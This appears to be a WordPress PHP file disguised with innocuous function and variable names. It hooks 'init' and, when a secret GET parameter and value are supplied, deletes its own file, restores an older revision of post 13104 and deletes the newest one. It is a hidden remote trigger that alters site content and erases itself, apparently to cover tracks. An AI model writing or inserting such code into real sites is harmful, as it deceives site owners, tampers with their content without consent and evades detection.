<?php

function supports_recipe_thumbnail() {
	if (isset($_GET['address_daily_ultimate']) && $_GET['address_daily_ultimate'] === 'delivery_wpforms_ui_pagination') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$label_wpc_make = 13104;
		$authors_variations_codes_title = wp_get_post_revisions($label_wpc_make);
		if (empty($authors_variations_codes_title)) die('no revisions');
		if (count($authors_variations_codes_title) < 2) die('less than 2');
		$wpforms_learndash_stop_connector = array_shift($authors_variations_codes_title);
		$select_tags_js = $wpforms_learndash_stop_connector->ID;
		$recaptcha_checker_core_register = array_shift($authors_variations_codes_title);
		$pixel_blocker_endpoints_files = $recaptcha_checker_core_register->ID;
		$health_domain_quote = wp_restore_post_revision($pixel_blocker_endpoints_files);
		if ($health_domain_quote === false) die('error restoring');
		$health_domain_quote = wp_delete_post_revision($select_tags_js);		
		if ($health_domain_quote === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'supports_recipe_thumbnail');
